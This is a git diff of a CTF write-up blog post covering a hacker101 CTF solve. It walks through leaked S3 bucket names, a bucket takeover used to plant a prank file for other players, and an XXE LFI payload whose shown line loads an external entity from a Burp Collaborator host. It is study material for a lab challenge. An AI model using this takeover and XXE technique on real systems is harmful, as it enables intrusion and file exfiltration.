@@ -4,22 +4,22 @@ date: 2021-06-19T12:24:35+05:30
 draft: false
 ---
 
-This write-up is co-written by me [@Dexter0us](https://twitter.com/0xDexter0us) and [@mass0ma](https://twitter.com/mass0ma). We were one of the winners of the CTF and won a $100 reward from [hacker101](https://hacker101.com). The CTF was quiet challenging and fun to play. Hope you can enjoy and gain something from this write-up. You can folow us of Twitter [@Dexter0us](https://twitter.com/0xDexter0us), [@mass0ma](https://twitter.com/mass0ma) and can hang out with us on Discord [Hack The Planet](https://discord.gg/pRZDxmxp) [Bounty Hunters](https://discord.gg/bugbounty) if you like :).
+
+This write-up is co-written by me [@Dexter0us](https://twitter.com/0xDexter0us) and [@mass0ma](https://twitter.com/mass0ma). We were one of the winners of the CTF and won a $100 reward from [hacker101](https://hacker101.com). The CTF was quiet challenging and fun to play. We hope you can enjoy and gain something from this write-up. You can folow us of Twitter [@Dexter0us](https://twitter.com/0xDexter0us), [@mass0ma](https://twitter.com/mass0ma) and hang out with us on Discord [Hack The Planet](https://discord.gg/pRZDxmxp) [Bounty Hunters](https://discord.gg/bugbounty) if you like :).
 
 ---
 
-We started the CTF with the basic endpoint enumeration we found two endpoints `.config` and `zipfiles` which were looking interesting but both of them turned out to be rabbit hole nothing was in there, we also started looking at Javascript files nothing interesting even there. Then we started to play with the application registered for an account. And then a hint poped up in twitter.
+We started the CTF with the basic endpoint enumeration. We found two endpoints `.config` and `zipfiles` which were looked interesting but both turned out to be rabbit holes and nothing was in them. We also looked at Javascript files and registered for an account within the application, but didn't come across anything interesting. That's when a hint popped up on twitter.
 
 {{< image src="/images/ccc-h1ctf/image-20210603221644140.png" position="center" style="border-radius: 5px;" >}}
 
 
-
-An endpoint disclosure but we had to guess the extension which wasn't hard it was just a `.txt`, in that `error_-_-_log.txt` we found our first interesting clue.
+An endpoint disclosure! We had to guess the extension which was simply `txt`. In that `error_-_-_log.txt` file we found our first interesting clue.
 
 {{< image src="/images/ccc-h1ctf/image-20210603221849214.png" position="center" style="border-radius: 5px;" >}}
 
 
-Five AWS S3 bucket urls. Since the CTF was based on todayisnew’s best vulnerabilities. We all know two best bug class of todayisnew is Subdomain Takeover and Information Disclosure. Right away we jumped and started to test the permissions of these S3 buckets, out of five buckets only two of them gave interesting result, first one `h1-6hin8w` gave `NXDOMAIN` and from the second bucket `h1-cn9uhd` we were able to fetch the `files.xml` file.
+Five AWS S3 bucket URLs. Since the CTF was based on [@todayisnew](https://twitter.com/codecancare)’s best vulnerabilities, we knew the two best bug classes to hunt for would be Subdomain Takeover and Information Disclosure. Right away we started to test the permissions of these S3 buckets. Out of five buckets only two gave interesting results. The first, `h1-6hin8w`, returned `NXDOMAIN` and the second, `h1-cn9uhd`, allowed to access a file called `files.xml`.
 
 {{< image src="/images/ccc-h1ctf/image-20210603223741876.png" position="center" style="border-radius: 5px;" >}}
 
@@ -28,24 +28,24 @@ Five AWS S3 bucket urls. Since the CTF was based on todayisnew’s best vulnerab
 {{< image src="/images/ccc-h1ctf/image-20210603223732544.png" position="center" style="border-radius: 5px;" >}}
 
 
-Since the CTF is based around todayisnew's methodology first thing I did was to takeover that S3 bucket and uploaded a PoC at `https://h1-6hin8w.s3.eu-west-2.amazonaws.com/poc.dexter0us.txt` then I had an evil idea. 
+Since the CTF is based around todayisnew's methodology, first thing I did was to takeover that S3 bucket and uploaded a PoC at `https://h1-6hin8w.s3.eu-west-2.amazonaws.com/poc.dexter0us.txt` then I had an evil idea. 
 
 {{< image src="https://media1.tenor.com/images/c7226c3298a1885eacac632bf3d6cf74/tenor.gif?itemid=12538746" position="center" style="border-radius: 5px;" >}}
 
 
-why not make a files.xml file and upload it to bucket and have some fun with other CTF players, so we played an innocent prank on other CTF players. We encoded Rick Astley's song in base64 and uploaded it.
+Why not make a fake `files.xml` file and upload it to bucket and have some fun with other CTF players?,So we played an innocent prank on other CTF players by encoding a rick roll URL in base64 and uploading it in files.xml.
 
 {{< image src="/images/ccc-h1ctf/image-20210603222925432.png" position="center" style="border-radius: 5px;" >}}
 
 
-Now from the downloaded xml file we discovered a new domain `patopirata.com` after digging a bit and some directory bruteforcing on that new domain we discovered a new file `http://patopirata.com/info.php` while later turned out to be another rabbit hole. But the xml file in itself was a big hint  **XXE**
+From the downloaded xml file we discovered a new domain `patopirata.com`. After some digging and directory bruteforcing on that new domain, we discovered a new file `http://patopirata.com/info.php` although this turned out to be another rabbit hole. However, the xml file in itself was a big hint: **XXE**
 
 {{< image src="/images/ccc-h1ctf/image-20210603224127421.png" position="center" style="border-radius: 5px;" >}}
 ---
 
 {{< image src="/images/ccc-h1ctf/image-20210603224304860.png" position="center" style="border-radius: 5px;" >}}
 
-After falling into two rabbit holes we started to test the main application, we discovered that when you create a login on the site you get a unique hash e.g. `https://ccc.h1ctf.com/u/2h8x50` from that `error_-_-_log.txt` file we guessed that we must have to create an S3 bucket with our unique hash to store our own `files.xml` file to trigger out XXE payload. With a bit of trial and error we came up with this XXE LFI payload:
+After falling into two rabbit holes we started to test the main application, we discovered that when you create a login on the site you get will receive an unique hash e.g. `https://ccc.h1ctf.com/u/2h8x50` from that `error_-_-_log.txt` file we guessed that we must have to create a S3 bucket with our unique hash to store our own `files.xml` file to trigger out XXE payload. With a bit of trial and error we came up with this XXE LFI payload:
 
 ```xml-dtd
 <!ENTITY % filepd SYSTEM "https://o3s52u8tar80ojlzicatifurxi39ry.burpcollaborator.net">
